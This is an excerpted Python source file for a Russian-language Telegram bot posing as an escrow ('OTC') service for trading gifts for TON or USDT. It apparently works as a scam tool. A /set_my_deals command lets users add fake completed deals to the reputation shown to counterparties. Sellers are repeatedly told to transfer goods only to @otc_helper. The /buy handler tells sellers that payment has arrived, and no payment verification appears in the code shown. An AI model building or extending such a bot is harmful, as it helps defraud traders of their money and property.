...
SUPPORT_USERNAME = "theotrysupp"

# Конфигурация видео для разных сообщений
VIDEO_FILES = {
    "start": "start.mp4",
    "settings": "settings.mp4",
    "referral": "referral.mp4",
    "my_reqs": "my_reqs.mp4",
    "create_deal": "create_deal.mp4",
    "default": "default.mp4"
}
...
def cleanup_old_data():
    ...
    with DATA_LOCK:
        for user_id in list(data.keys()):
            if isinstance(data[user_id], dict) and "deals" in data[user_id]:
    ...
    for attempt in range(max_retries):
        try:
            ...
            if attempt < max_retries - 1:
                ...
                print(f"⏳ Timeout, повторная попытка через {wait_time}с...")
...
async def send_message_with_video(chat_id, text, video_key="default", reply_markup=None, context=None, message=None):
        ...
        if os.path.exists(video_path):
            ...
            if video_input and file_obj:
                try:
                    ...
                    print(f"❌ Timeout при отправке видео даже после повторных попыток")
                    if file_obj:
                        file_obj.close()
                except Exception as e:
    ...
    try:
        ...
        if not args:
            await update.message.reply_text(
                "❌ Использование: /set_my_deals [количество сделок]\n\n"
                "Пример: /set_my_deals 10"
            )
            return
        ...
        try:
            ...
            if deals_count < 0:
                await update.message.reply_text("❌ Количество сделок не может быть отрицательным.")
                return
            if deals_count > MAX_DEALS_PER_USER:
                await update.message.reply_text(f"❌ Слишком большое количество сделок (максимум {MAX_DEALS_PER_USER}).")
                return
        except ValueError:
        ...
        if save_data():
            await update.message.reply_text(
                f"✅ Успешно добавлено {deals_count} завершенных сделок!\n"
                f"📊 Теперь у вас {current_deals + deals_count} завершенных сделок."
            )
        else:
...
async def buy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    try:
        ...
        if deal.get("buyer_id") != buyer_id:
            await update.message.reply_text("❌ Вы не являетесь покупателем в этой сделке.")
            return
        ...
        if deal.get("paid", False):
            await update.message.reply_text("❌ Эта сделка уже была оплачена.")
            return
        ...
        seller_text = (
            f"💥 Оплата получена по сделке {deal_code}!\n\n"
            f"Тип сделки: 🎁 Подарки.\n"
            f"👤 Покупатель: @{buyer_username} (id: {buyer_id})\n\n"
            f"‼️ Передайте товар → @otc_helper ‼️\n\n"
            f"Получаете: {deal.get('amount', 0)} {deal.get('currency', '')}\n"
            f"Отдаёте: {deal.get('description', 'Не указано')}\n\n"
            f"‼️ Передавайте товар только @otc_helper\n"
            f"В случае передачи товара другому человеку возврат не будет осуществлен.\n"
            f"Для получения гарантий, записывайте на видео момент передачи товара."
        )
        ...
        buyer_text = (
            f"💥 Транзакция по сделке {deal_code} найдена!\n\n"
            f"Тип сделки: 🎁 Подарки\n\n"
            f"👤 Продавец: @{seller_username} (id: {seller_id})\n\n"
            f"Получаете: {deal.get('description', 'Не указано')}\n"
            f"Отдаёте: {deal.get('amount', 0)} {deal.get('currency', '')}\n\n"
            f"‼️ Сделка завершится после того как продавец передаст товар @otc_helper и вы это подтвердите."
        )
...
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
            ...
            if text.startswith('/start ref_'):
                ...
                if len(parts) > 1:
                    ...
                    if referrer_id and referrer_id != user_id and referrer_id.isdigit():
                        ...
                        await update.message.reply_text(f"✅ Вы перешли по реферальной ссылке!")
        ...
        text = (
            ...
            "💎 Комиссия за услугу: 1%\n"
            "💎 Поддержка 24/7: @otc_helper\n\n"
...
async def show_deal_to_buyer(update: Update, context: ContextTypes.DEFAULT_TYPE, deal_code):
    ...
    try:
        ...
        deal_text = (
            f"🛍 Сделка {deal_code}\n"
            f"Тип сделки: 🎁 Подарки\n\n"
            f"👤 Вы покупатель, у вас есть 15 минут на оплату сделки!\n\n"
            f"📌 Продавец: @{seller_username}\n"
            f"• Количество сделок продавца: {seller_deals_count}\n\n"
            f"• Вы покупаете: {deal.get('description', 'Не указано')}\n"
            f"• Вы отдаете: {deal.get('amount', 0)} {deal.get('currency', '')}\n\n"
            f"🏦 Кошелёк для оплаты:\n"
            f"{requisite_value}\n\n"
            f"🤑 Сумма к оплате:\n"
            f"💎 {deal.get('amount', 0)} {deal.get('currency', '')}\n\n"
            f"🎯 Комментарий к транзакции:\n"
            f"{deal_code}\n\n"
            f"‼️ Пожалуйста, убедитесь что при оплате указываете обязательный комментарий (memo) и точную сумму!\n\n"
            f"После оплаты ожидайте подтверждения администратором."
        )
        ...
        seller_text = (
            ...
            f"присоединился к вашей сделке {deal_code}\n\n"
            f"• Количество сделок покупателя: {buyer_deals_count}\n"
            f"‼️ Убедитесь, что это тот же пользователь, с которым вы вели диалог ранее!\n\n"
            f"Не передавайте товар(ы) до получения сообщения от бота о подтверждении оплаты!"
        )
        ...
        if update.message:
            await update.message.reply_text("❌ Произошла ошибка при открытии сделки.")
...
async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        ...
        if query.data == "referral_system":
            ...
            text = (
                "👤 Реф. система\n\n"
                f"💎 Ваш реферальный процент: 1%\n"
                f"💎 Приглашено пользователей: {stats['count']}\n"
                f"💎 Реф. баланс TON: {stats['balance_ton']}\n"
                f"💎 Реф. баланс USDT TON: {stats['balance_usdt']}\n\n"
        ...
        if query.data.startswith("transferred_"):
            ...
            # Здесь нужно найти сделку по короткому коду
            deal = None
            creator_id = None
            for uid, user_data in data.items():
                if isinstance(user_data, dict):
                    ...
                    if isinstance(deals, list):
                        for d in deals:
                            if isinstance(d, dict) and get_short_code(d.get("id", "")) == short_code:
                                deal = d
                                creator_id = uid
                                break
            ...
            text = (
                f"✅ Вы подтвердили передачу подарка для сделки {deal.get('id')}\n\n"
                f"Ожидайте подтверждения получения от покупателя\n\n"
                f"Убедитесь, что передали подарок @otc_helper, в противном случае "
                f"покупатель не сможет увидеть и подтвердить передачу подарка, "
                f"а вы в свою очередь не получите оплату."
            )
            ...
            if not save_data():
                await query.message.reply_text("❌ Ошибка при сохранении данных.")
                return
            ...
            text = (
                f"✅ Успешная сделка!\n\n"
                f"Вы подтвердили получение подарка.\n\n"
                f"Сделка завершена!"
            )
            ...
            if creator_id:
                try:
                    await context.bot.send_message(
                        chat_id=int(creator_id),
                        text=f"✅ Покупатель подтвердил получение подарка по сделке {deal.get('id')}\n\nСделка успешно завершена!"
                    )
                except Exception as e:
                    print(f"⚠️ Не удалось уведомить продавца: {e}")

        elif query.data == "menu_create_deal":
            if query.message:
                try:
                    await query.message.delete()
                except:
            ...
            if query.message:
                try:
                    ...
                    pass
            text = f"🎁 Создание сделки\n\nВведите сумму сделки в {currency} (например: 100.50)"
            await send_message_with_video(
                chat_id=update.effective_chat.id,
                text=text,
                video_key="create_deal",
            ...
            try:
                ...
                if not all([context.user_data.get("deal_currency"), 
                    ...
                    await send_message_with_video(
                        chat_id=update.effective_chat.id,
                        text="❌ Данные сделки утеряны. Начните создание заново.",
                        video_key="default",
                        reply_markup=create_deal_keyboard(),
                        context=context
                    )
                ...
                text = (
                    ...
                    "Тип сделки: 🎁 Подарки\n\n"
                    f"📦 Отдаёте: {deal['description']}\n"
                    f"💰 Получаете: {deal['amount']} {deal['currency']}\n\n"
                ...
                await send_message_with_video(
                    chat_id=update.effective_chat.id,
                    text="❌ Ошибка при выборе реквизита.",
                    video_key="default",
                    reply_markup=create_deal_keyboard(),
                    context=context
                )
            ...
            messages = {
                "add_ton": (
                    ...
                    "Пришлите адрес TON кошелька\n"
                    "Формат должен начинаться с EQ... или UQ... и содержать 48 символов\n\n"
                    "Пример: UQAvqf6x2sPJdLqX3KqX3KqX3KqX3KqX3KqX3KqX3KqX"
                ),
                "add_card": (
                    "💳 Добавление карты\n\n"
                    "Пришлите данные в формате:\n"
                    "Банк - Номер карты (16 цифр)\n\n"
                    "Пример: Сбербанк - 4276 1234 5678 9012"
                ),
                "add_username": (
                    "👤 Добавление username\n\n"
                    "Пришлите ваш @username\n"
                    "Формат должен начинаться с @\n\n"
                    "Пример: @username123"
                )
            }
            
            text = messages.get(query.data, "Неизвестная команда")
            await send_message_with_video(
                chat_id=update.effective_chat.id,
                text=text,
                video_key="my_reqs",
    ...
    try:
        ...
        if expect == "deal_amount":
            try:
                ...
                await send_message_with_video(
                    chat_id=update.effective_chat.id,
                    text="📝 Введите описание сделки (что отдаёте):",
                    video_key="create_deal",
                    reply_markup=single_back_keyboard(),
                    context=context,
                    message=update.message
                ...
                await send_message_with_video(
                    chat_id=update.effective_chat.id,
                    text="❌ Ошибка при обработке суммы.",
                    video_key="default",
                    reply_markup=single_back_keyboard(),
                    context=context,
                    message=update.message
            ...
            if not reqs:
                await send_message_with_video(
                    chat_id=update.effective_chat.id,
                    text="❌ У вас нет реквизитов. Сначала добавьте реквизит.",
                    video_key="my_reqs",
                    reply_markup=my_reqs_keyboard(user_id),
                    context=context,
                    message=update.message
            ...
            await send_message_with_video(
                chat_id=update.effective_chat.id,
                text="💰 Выберите реквизит для получения оплаты:",
                video_key="create_deal",
            ...
            if expect == "ton":
                ...
                error_message = "❌ Неверный формат TON кошелька. Адрес должен начинаться с EQ... или UQ... и содержать 48 символов."
            elif expect == "card":
                is_valid = validate_card(text)
                error_message = "❌ Неверный формат карты. Используйте формат: Банк - 16 цифр"
            elif expect == "username":
                is_valid = validate_username(text)
                error_message = "❌ Неверный формат username. Username должен начинаться с @"
            ...
            for req in requisites:
                if isinstance(req, dict) and req.get("value") == text:
                    await send_message_with_video(
                        chat_id=update.effective_chat.id,
                        text="❌ Такой реквизит уже существует!",
                        video_key="my_reqs",
                        reply_markup=my_reqs_keyboard(user_id),
                        context=context,
                        message=update.message
            ...
            if save_data():
                ...
                await send_message_with_video(
                    chat_id=update.effective_chat.id,
                    text="✅ Реквизит успешно добавлен!",
                    video_key="my_reqs",
                    reply_markup=my_reqs_keyboard(user_id),
                    context=context,
                    message=update.message
...
def main():
    ...
    try:
        if os.path.exists(PHOTO_PATH):
            if os.path.getsize(PHOTO_PATH) > 0:
                print(f"✅ Фото найдено: {PHOTO_PATH}")
            else:
    ...
    try:
        ...
        print("3. Установленные библиотеки (pip install python-telegram-bot)")
